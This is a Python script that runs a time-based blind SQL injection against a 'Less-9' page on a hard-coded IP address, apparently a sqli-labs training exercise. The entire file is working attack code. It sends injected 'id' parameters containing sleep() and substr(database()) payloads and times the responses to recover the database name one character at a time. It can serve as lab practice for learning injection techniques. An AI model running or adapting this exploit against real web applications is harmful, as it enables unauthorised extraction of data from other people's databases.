# coding:utf-8
import datetime

import requests


# 获取数据库名长度
def database_len():
    for i in range(1, 10):
        url = "http://180.21.14.254:8080/Less-9/index.php"
        payload = " ?id=1' and if(length(database())>%s,sleep(1),0) --+" % i
        # print(url+payload+'%23')
        time1 = datetime.datetime.now()
        r = requests.get(url + payload)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 1:
            print(i)
        else:
            print(i)
            break
    print('database_len:', i)


# 获取数据库名
def database_name():
    name = ''
    for j in range(1, 9):
        for i in '0123456789abcdefghijklmnopqrstuvwxyz':
            url = "http://180.21.14.254:8080/Less-9/index.php"

            payload = "?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+" % (j, i)
            # print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 3:
                name += i
                print(name)
                break
    print('database_name:', name)


if __name__ == '__main__':
    database_name()
